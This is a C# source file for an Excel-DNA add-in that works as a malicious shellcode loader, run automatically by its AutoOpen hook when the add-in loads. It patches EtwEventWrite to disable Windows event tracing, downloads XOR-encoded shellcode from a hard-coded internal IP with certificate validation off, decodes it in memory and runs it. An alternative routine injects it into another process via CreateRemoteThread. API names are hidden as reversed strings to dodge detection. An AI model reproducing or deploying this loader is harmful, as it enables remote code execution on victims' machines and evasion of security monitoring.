using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace excelDNALibrary
{
    public class Class1 : ExcelDna.Integration.IExcelAddIn
    {
        //shrun  
        private static string url = "http://10.10.10.10/sli32.html"; // Location of the shellcode.

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] // VirtualAlloc
        public delegate IntPtr VA(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] // CreateThread
        public delegate IntPtr CT(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] // Waitforsingleobject
        public delegate UInt32 WFSO(IntPtr hHandle, UInt32 dwMilliseconds);

        private delegate int AssemblyDecFunction(int x, IntPtr y);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] // VirtualFree
        public delegate bool VF(IntPtr lpAddress, int dwSize, uint dwFreeType);


        //shin 

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] //OpenProcess
        public delegate IntPtr OP(uint processAccess, bool bInheritHandle, uint processId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] // VirtualAllocEx
        public delegate IntPtr VAE(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] // WriteProcessMemory
        public delegate bool WPM(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] // CreateRemoteThread
        public delegate IntPtr CRT(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] // VirtualFreeEx
        public delegate bool VFE(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint dwFreeType);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)] //Close Handle 
        public delegate bool CH(IntPtr handle);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VP(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscribed, out uint ZygosisCoordination);





        public struct Parameters
        {
            public int x;
            public IntPtr y;
        }
        static public IntPtr Valloc(byte[] opcodes)
        {
            IntPtr pVA = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("collAlautriV"));
            VA fVA = (VA)Marshal.GetDelegateForFunctionPointer(pVA, typeof(VA));
            IntPtr addr = fVA(IntPtr.Zero, (uint)opcodes.Length, 0x3000, 0x40);
            Marshal.Copy(opcodes, 0, addr, opcodes.Length);
            return addr;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsWow64Process2(IntPtr process, out ushort processMachine, out ushort nativeMachine);






        public void AutoOpen() //
        {
            PatchFunctions(); // Patch ETW

            // Choose between Shellcode Runner or Injector. 

            DownloadAndExecute();
            //DownloadAndInject(1231); //provide PID as an arg

         }

        public static void DownloadAndExecute()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shc = client.DownloadData(url);
            byte[] dec = {                          //decoder:
                            0x55,                   //  push ebp
                            0x89, 0xe5,             //  mov ebp,esp
                            0x8b, 0x45, 0x0c,       //  mov eax, dword ptr[ebp+12] 
                            0x8b, 0x55, 0x08,       //  mov edx, dword ptr[ebp+8]
                            0x31, 0xc9,             //  xor ecx, ecx
                                                    //loop:            
                            0x39, 0xd1,             //  cmp ecx,edx
                            0x74, 0x0d,             //  je  decodedsh 
                            0x80, 0x30, 0x03,       //  xor byte ptr [eax], 0x03
                            0x80, 0x30, 0x56,       //  xor byte ptr [eax], 0x56
                            0x80, 0x30, 0x12,       //  xor byte ptr [eax], 0x12
                            0x40,                   //  inc eax
                            0x41,                   //  inc ecx
                            0xeb, 0xef,             //  jmp loop
                                                    //decodesh:
                            0x89, 0xec,             //  mov esp, ebp
                            0x5d,                   //  pop ebp
                            0xc3                    //  ret
                        };   //decodes code in memory that triple xor encoded 
            IntPtr shc_addr = Valloc(shc);
            IntPtr dec_addr = Valloc(dec);
            var water = Marshal.GetDelegateForFunctionPointer<AssemblyDecFunction>(dec_addr);
            int returnValue = water(shc.Length, shc_addr);

            IntPtr pCT = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("daerhTetaerC"));
            CT fCT = (CT)Marshal.GetDelegateForFunctionPointer(pCT, typeof(CT));

            IntPtr hThread = fCT(IntPtr.Zero, 0, shc_addr, IntPtr.Zero, 0, IntPtr.Zero);

            IntPtr pWFSO = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("tcejbOelgniSroFtiaW"));
            WFSO fWFSO = (WFSO)Marshal.GetDelegateForFunctionPointer(pWFSO, typeof(WFSO));
            fWFSO(hThread, 0xFFFFFFFF);

            IntPtr pVF = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("eerFlautriV"));
            VF fVF = (VF)Marshal.GetDelegateForFunctionPointer(pWFSO, typeof(VF));
            fVF(dec_addr, 0, 0x4000);
            return;
        }



        public static void DownloadAndInject(uint pid)
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] buf = client.DownloadData(url);
            byte[] dec = {                          //decoder:
                           0x55,                    // push ebp
                           0x89, 0xe5,              // mov ebp,esp
                           0x8b, 0x5d, 0x08,        // mov ebx, dword ptr[ebp+8]
                           0x8b, 0x13,              // mov edx, dword ptr[ebx]
                           0x8b, 0x43, 0x04,        // mov eax, dword ptr[ebx+0x4]
                           0x31, 0xc9,              // xor ecx, ecx
                                                    //loop:
                           0x39, 0xd1,              // cmp ecx, edx
                           0x74, 0x0d,              // je  decodedsh 
                           0x80, 0x30, 0x03,        // xor byte ptr [eax], 0x03 
                           0x80, 0x30, 0x56,        // xor byte ptr [eax], 0x56 
                           0x80, 0x30, 0x12,        // xor byte ptr [eax], 0x12 
                           0x40,                    // inc eax
                           0x41,                    // inc ecx
                           0xeb, 0xef,              // jmp loop
                                                    //decodesh:
                           0x89, 0xec,              // mov esp, ebp
                           0x5d,                    // pop ebp
                           0xc3                     // ret
                        };  //decodes code in memory that triple xor encoded 
            IntPtr pOP = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("ssecorPnepO"));
            OP fOP = (OP)Marshal.GetDelegateForFunctionPointer(pOP, typeof(OP));
            IntPtr hProcess = fOP(0x001F0FFF, false, pid); // PID of process should be used here 

            IntPtr pVAE = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("xEcollAlautriV"));
            VAE fVAE = (VAE)Marshal.GetDelegateForFunctionPointer(pVAE, typeof(VAE));

            IntPtr addr_sh = fVAE(hProcess, IntPtr.Zero, buf.Length, 0x3000, 0x40);
            IntPtr addr_dec = fVAE(hProcess, IntPtr.Zero, dec.Length, 0x3000, 0x40);
            IntPtr addr_param = fVAE(hProcess, IntPtr.Zero, 0x8, 0x3000, 0x04);
            IntPtr outSize;
            //  Marshal.Copy(pnt, dec, 0, dec.Length); 
            IntPtr pWPM = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("yromeMssecorPetirW"));
            WPM fWPM = (WPM)Marshal.GetDelegateForFunctionPointer(pWPM, typeof(WPM));
            fWPM(hProcess, addr_sh, buf, buf.Length, out outSize); //write sh 
            fWPM(hProcess, addr_dec, dec, dec.Length, out outSize); //write dec 
            Parameters param = new Parameters();
            param.x = buf.Length;
            param.y = addr_sh;
            IntPtr iptrtoparams = Marshal.AllocHGlobal(Marshal.SizeOf(param));
            Marshal.StructureToPtr(param, iptrtoparams, false);
            byte[] array = new byte[8];
            Marshal.Copy(iptrtoparams, array, 0, 8);
            fWPM(hProcess, addr_param, array, 8, out outSize); //write params 

            IntPtr pCRT = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("daerhTetomeRetaerC"));
            CRT fCRT = (CRT)Marshal.GetDelegateForFunctionPointer(pCRT, typeof(CRT));

            IntPtr hThread = fCRT(hProcess, IntPtr.Zero, 0, addr_dec, addr_param, 0, IntPtr.Zero);
            Console.WriteLine("hello");


            IntPtr pWFSO = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("tcejbOelgniSroFtiaW"));
            WFSO fWFSO = (WFSO)Marshal.GetDelegateForFunctionPointer(pWFSO, typeof(WFSO));
            fWFSO(hThread, 0xFFFFFFFF);

            IntPtr hThread1 = fCRT(hProcess, IntPtr.Zero, 0, addr_sh, IntPtr.Zero, 0, IntPtr.Zero);
            Process.GetCurrentProcess().Kill();

            
        }

        public void AutoClose()
        {
            System.Windows.Forms.MessageBox.Show("fires when the add-in is unl1oaded");
        }

        public static string udf_SOMETEXT()
        {
            return "hola amigos";
        }

        private static void PatchFunctions()
        {


            IntPtr pVP = GetLibraryAddress(Reverse("lld.23lenrek"), Reverse("tcetorPlautriV")); //VirtualProtect
            VP fVP = (VP)Marshal.GetDelegateForFunctionPointer(pVP, typeof(VP));


            IntPtr pEEW = GetLibraryAddress(Reverse("lld.lldtn"), Reverse("etirWtnevEwtE")); //EtwEventWrite



            var patch = Convert.FromBase64String("whQA");
            uint oldProtect;

            if (fVP(pEEW, (UIntPtr)patch.Length, 0x40, out oldProtect))
            {
                Marshal.Copy(patch, 0, pEEW, patch.Length);
            }


        }

        public static string Reverse(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }

        //
        //functions below taken from https://github.com/Flangvik/NetLoader
        //
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }


        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }

        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }

            return FunctionPtr;
        }
    }

}